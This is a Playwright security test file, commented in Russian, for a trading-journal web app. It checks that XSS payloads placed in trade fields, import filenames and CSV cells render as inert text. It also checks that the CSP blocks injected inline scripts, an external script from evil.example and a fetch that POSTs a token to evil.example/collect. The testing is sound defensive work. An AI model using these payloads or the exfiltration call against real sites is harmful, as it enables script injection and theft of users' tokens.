/**
 * Попытки взлома самого сайта (не базы): подсунуть вредный код через данные и файлы.
 * Если хоть одна «сработает», выставится window.__xss или появится alert — тест упадёт.
 */
import { test as plainTest } from '@playwright/test'
import { test, expect, fakeSupabase, makeTrade, type FakeDb } from './fixtures'

const P = {
  img: '<img src=x onerror="window.__xss=1">',
  svg: '"><svg onload="window.__xss=2">',
  script: '<script>window.__xss=3</script>',
  js: 'javascript:window.__xss=4',
  tpl: "{{constructor.constructor('window.__xss=5')()}}",
}
const ALL = Object.values(P)

async function noXss(page: import('@playwright/test').Page) {
  expect(await page.evaluate(() => (window as unknown as { __xss?: number }).__xss)).toBeUndefined()
}

test.describe('вредный код в данных показывается как текст и не выполняется', () => {
  test.beforeEach(async ({ page }) => {
    page.on('dialog', (d) => {
      throw new Error(`всплыло окно: ${d.message()}`)
    })
  })

  test('названия, заметки, пары, журнал импортов — на всех страницах', async ({ page, db }) => {
    db.listNames = ALL
    db.trades = [
      makeTrade(1, { note: ALL.join('\n'), symbol: P.img, exchange: P.svg, setup_id: 's1', emotion_id: 's2', trade_mistakes: [{ tag_id: 's3' }] }),
      makeTrade(2, { symbol: P.script, setup_id: 's4' }),
    ]
    db.imports = [{ id: 'i1', exchange: P.js, filename: P.img + '.csv', rows_total: 1, rows_imported: 1, rows_skipped: 0, created_at: '2026-11-01T00:00:00Z' }]
    await fakeSupabase(page, db)

    for (const path of ['dashboard', 'trades', `trades/${db.trades[0].id}`, 'import', 'settings']) {
      await page.goto(path)
      await page.waitForLoadState('networkidle')
      await page.waitForTimeout(300)
      await noXss(page)
    }
    // и вредный текст действительно на странице — просто как текст
    await page.goto('settings')
    await expect(page.getByText(P.img, { exact: true }).first()).toBeAttached()
    await page.goto(`trades/${db.trades[0].id}`)
    await expect(page.getByLabel('Заметка')).toHaveValue(ALL.join('\n'))
    await noXss(page)
  })

  test('CSV с вредными заголовками и ячейками', async ({ page, db }) => {
    await fakeSupabase(page, db)
    await page.goto('import')
    const csv = [
      ['Date(UTC)', 'Symbol', 'Side', 'Price', 'Quantity', P.img].join(','),
      ['2026-11-01 10:00:00', `"${P.svg.replace(/"/g, '""')}"`, 'BUY', '60000', '0.01', P.script].join(','),
      ['2026-11-01 12:00:00', 'BTCUSDT', 'SELL', '61000', '0.01', P.js].join(','),
    ].join('\n')
    await page.locator('input[type=file]').setInputFiles({ name: `${P.img}.csv`, mimeType: 'text/csv', buffer: Buffer.from(csv) })
    await expect(page.getByText(/Новых: \d/)).toBeVisible()
    await page.getByRole('button', { name: /Настроить колонки/ }).click()
    await page.waitForTimeout(300)
    await noXss(page)
  })
})

// здесь нарушения CSP — ожидаемый результат (браузер блокирует подсунутое), поэтому без общего контроля fixtures
plainTest('подсунутый скрипт не выполняется (защита CSP)', async ({ page }) => {
  const db: FakeDb = { trades: [], imports: [], inserted: [], factors: [], aal: 'aal1', usage: { plan: 'free', trades_created: 0, trade_limit: 30 } }
  const blocked: string[] = []
  page.on('console', (m) => /Content Security Policy/i.test(m.text()) && blocked.push(m.text()))
  await fakeSupabase(page, db, { signedIn: false })
  await page.goto('login')
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')
  expect(csp).toContain("script-src 'self'")
  expect(csp).toContain("object-src 'none'")
  // как будто злоумышленнику удалось вставить на страницу скрипт — встроенный и с чужого сайта
  await page.evaluate(() => {
    const inline = document.createElement('script')
    inline.textContent = 'window.__xss = 6'
    document.body.appendChild(inline)
    const external = document.createElement('script')
    external.src = 'https://evil.example/steal.js'
    document.body.appendChild(external)
    const img = document.createElement('img')
    img.setAttribute('src', 'x')
    img.setAttribute('onerror', 'window.__xss = 7')
    document.body.appendChild(img)
  })
  await page.waitForTimeout(500)
  await noXss(page)
  // отправить украденное на чужой адрес тоже нельзя
  const sent = await page.evaluate(() =>
    fetch('https://evil.example/collect', { method: 'POST', body: 'token' }).then(() => 'sent', () => 'blocked'),
  )
  expect(sent).toBe('blocked')
  // заблокировал именно браузер по нашей политике: встроенный скрипт, чужой скрипт, onerror и отправку данных
  expect(blocked.some((m) => /inline script|script-src-elem|script-src/i.test(m))).toBe(true)
  expect(blocked.some((m) => /evil\.example\/steal\.js/.test(m))).toBe(true)
  expect(blocked.some((m) => /connect-src/.test(m))).toBe(true)
})
